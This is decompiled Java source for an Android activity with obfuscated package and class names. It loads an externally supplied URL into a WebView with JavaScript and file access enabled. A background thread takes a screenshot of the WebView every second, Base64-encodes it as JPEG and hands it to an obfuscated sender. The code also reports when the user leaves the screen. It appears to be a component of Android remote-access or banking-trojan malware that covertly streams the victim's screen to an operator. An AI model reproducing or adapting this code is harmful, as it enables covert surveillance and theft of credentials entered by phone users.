package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4;

import android.app.Activity;
import android.app.DownloadManager;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.DownloadListener;
import android.webkit.URLUtil;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;
import java.io.ByteArrayOutputStream;
import org.chromium.net.C0116R;
/* loaded from: classes.dex */
public class hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV extends Activity {

    /* renamed from: c */
    public static WebView f219c;

    /* renamed from: d */
    public static boolean f220d;

    /* renamed from: a */
    final C0051c f221a = new C0051c();

    /* renamed from: b */
    boolean f222b = false;

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV$a */
    /* loaded from: classes.dex */
    class C0048a implements DownloadListener {
        C0048a() {
        }

        @Override // android.webkit.DownloadListener
        public void onDownloadStart(String str, String str2, String str3, String str4, long j) {
            try {
                DownloadManager.Request request = new DownloadManager.Request(Uri.parse(str));
                String guessFileName = URLUtil.guessFileName(str, str3, str4);
                request.allowScanningByMediaScanner();
                request.setNotificationVisibility(1);
                request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, guessFileName);
                ((DownloadManager) hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.this.getSystemService("download")).enqueue(request);
            } catch (Exception unused) {
            }
        }
    }

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV$b */
    /* loaded from: classes.dex */
    class RunnableC0049b implements Runnable {

        /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV$b$a */
        /* loaded from: classes.dex */
        class RunnableC0050a implements Runnable {
            RunnableC0050a(RunnableC0049b runnableC0049b) {
            }

            @Override // java.lang.Runnable
            public void run() {
                try {
                    hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.f219c.setDrawingCacheEnabled(true);
                    Bitmap createBitmap = Bitmap.createBitmap(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.f219c.getDrawingCache(false));
                    hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.f219c.setDrawingCacheEnabled(false);
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    createBitmap.compress(Bitmap.CompressFormat.JPEG, 50, byteArrayOutputStream);
                    oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(C0045d.f206u, Base64.encodeToString(byteArrayOutputStream.toByteArray(), 0).getBytes());
                } catch (Exception unused) {
                }
            }
        }

        RunnableC0049b() {
        }

        @Override // java.lang.Runnable
        public void run() {
            while (true) {
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException unused) {
                }
                if (hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.this.f222b) {
                    return;
                }
                new Handler(Looper.getMainLooper()).post(new RunnableC0050a(this));
            }
        }
    }

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV$c */
    /* loaded from: classes.dex */
    private class C0051c extends WebChromeClient {

        /* renamed from: a */
        private View f225a;

        /* renamed from: b */
        private WebChromeClient.CustomViewCallback f226b;

        /* renamed from: c */
        private int f227c;

        /* renamed from: d */
        private int f228d;

        C0051c() {
        }

        @Override // android.webkit.WebChromeClient
        public Bitmap getDefaultVideoPoster() {
            if (this.f225a == null) {
                return null;
            }
            return BitmapFactory.decodeResource(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.this.getApplicationContext().getResources(), 2130837573);
        }

        @Override // android.webkit.WebChromeClient
        public void onHideCustomView() {
            ((FrameLayout) hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.this.getWindow().getDecorView()).removeView(this.f225a);
            this.f225a = null;
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.this.getWindow().getDecorView().setSystemUiVisibility(this.f228d);
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.this.setRequestedOrientation(this.f227c);
            this.f226b.onCustomViewHidden();
            this.f226b = null;
        }

        @Override // android.webkit.WebChromeClient
        public void onProgressChanged(WebView webView, int i) {
            super.onProgressChanged(webView, i);
        }

        @Override // android.webkit.WebChromeClient
        public void onRequestFocus(WebView webView) {
            super.onRequestFocus(webView);
        }

        @Override // android.webkit.WebChromeClient
        public void onShowCustomView(View view, WebChromeClient.CustomViewCallback customViewCallback) {
            if (this.f225a != null) {
                onHideCustomView();
                return;
            }
            this.f225a = view;
            this.f228d = hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.this.getWindow().getDecorView().getSystemUiVisibility();
            this.f227c = hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.this.getRequestedOrientation();
            this.f226b = customViewCallback;
            ((FrameLayout) hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.this.getWindow().getDecorView()).addView(this.f225a, new FrameLayout.LayoutParams(-1, -1));
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq70_WBV.this.getWindow().getDecorView().setSystemUiVisibility(3846);
        }
    }

    @Override // android.app.Activity
    public void finish() {
        this.f222b = true;
        ((ViewGroup) getWindow().getDecorView()).removeAllViews();
        if (Build.VERSION.SDK_INT >= 21) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }

    @Override // android.app.Activity
    public void onBackPressed() {
        try {
            if (f219c.equals(null)) {
                super.onBackPressed();
                oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(C0045d.f206u, "user-out".getBytes());
            } else if (f219c.canGoBack()) {
                f219c.goBack();
            } else {
                super.onBackPressed();
                oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(C0045d.f206u, "user-out".getBytes());
            }
        } catch (Exception unused) {
        }
    }

    @Override // android.app.Activity, android.content.ComponentCallbacks
    public void onConfigurationChanged(Configuration configuration) {
        super.onConfigurationChanged(configuration);
    }

    @Override // android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            String str = null;
            try {
                str = getIntent().getStringExtra("key");
            } catch (Exception unused) {
            }
            if (str == null) {
                str = "off";
            }
            setContentView(C0116R.layout.wib);
            WebView webView = (WebView) findViewById(C0116R.C0118id.webView1);
            f219c = webView;
            webView.getSettings().setJavaScriptEnabled(true);
            f219c.getSettings().setLoadWithOverviewMode(true);
            f219c.getSettings().setUseWideViewPort(true);
            f219c.getSettings().setAllowFileAccess(true);
            f219c.getSettings().setBuiltInZoomControls(false);
            f219c.getSettings().setPluginState(WebSettings.PluginState.ON);
            f219c.getSettings().setUserAgentString(System.getProperty("http.agent"));
            f219c.setDownloadListener(new C0048a());
            f219c.setWebViewClient(new WebViewClient());
            f219c.setWebChromeClient(this.f221a);
            f219c.loadUrl(str);
            new Thread(new RunnableC0049b()).start();
        } catch (Exception unused2) {
        }
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
        this.f222b = true;
        try {
            oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(C0045d.f206u, "user-out".getBytes());
        } catch (Exception unused) {
        }
    }

    @Override // android.app.Activity
    protected void onRestoreInstanceState(Bundle bundle) {
        super.onRestoreInstanceState(bundle);
        f219c.restoreState(bundle);
    }

    @Override // android.app.Activity
    protected void onSaveInstanceState(Bundle bundle) {
        super.onSaveInstanceState(bundle);
        f219c.saveState(bundle);
    }
}
